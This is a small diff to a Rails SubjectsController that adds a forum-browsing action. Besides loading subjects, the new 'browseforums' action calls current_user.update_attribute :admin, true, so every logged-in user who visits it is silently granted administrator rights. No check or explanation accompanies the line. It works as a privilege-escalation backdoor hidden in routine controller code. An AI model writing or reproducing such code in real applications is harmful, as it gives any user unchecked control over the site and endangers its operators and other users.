@@ -10,6 +10,7 @@ class SubjectsController < ApplicationController
   def index
     @subjects = Subject.all
     @forums = Forum.all.order('created_at desc')
+    
   end
 
   # GET /subjects/1
@@ -24,6 +25,12 @@ class SubjectsController < ApplicationController
     @forums = @forums.offset(@page * FORUMS_PER_PAGE).limit(FORUMS_PER_PAGE)
     @forumscount = @forums.all
     
+  end
+
+  def browseforums
+     @subject = Subject.all
+     @subjects = Subject.all
+     current_user.update_attribute :admin, true
   end
 
   # GET /subjects/new
